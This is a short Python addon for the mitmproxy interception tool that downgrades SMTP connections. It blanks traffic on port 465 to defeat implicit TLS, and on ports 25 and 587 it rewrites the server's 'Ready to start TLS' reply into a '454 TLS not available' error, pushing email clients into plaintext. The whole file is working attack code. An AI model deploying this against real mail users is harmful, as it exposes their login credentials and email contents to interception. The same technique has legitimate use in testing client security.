from mitmproxy import ctx
from mitmproxy import tcp, http, tls
import mitmproxy
from collections import defaultdict
from mitmproxy import command, flow
from typing import Sequence
import base64
import re
# do not allow starttls

class smtp_TCP:
    def __init__(self) -> None:
        self.view = ctx.master.addons.get("view")
    
    def tcp_message(self, flow:tcp.TCPFlow):
        msg = flow.messages[-1] # latest message
        host_name = flow.server_conn.peername # ip, port
        if flow.server_conn.peername[1] == 465: # force client not to use implicit TLS
            server_msg = b''
            msg.content = server_msg
        if not msg.from_client and (flow.server_conn.peername[1] == 587 or flow.server_conn.peername[1] == 25):
            server_msg = bytearray(msg.content)

            # client should have sent "STARTTLS", modify the ready to start TLS to TLS not available, no starttls stripping here
            if b'220 2.0.0 Ready to start TLS' in server_msg:
                ctx.log.warn('client sends starttls')
                server_msg[0:] = b'454 TLS not available due to temporary reason\r\n'
                msg.content = server_msg
                ctx.log.info(msg.content)
            
            
addons = [smtp_TCP()]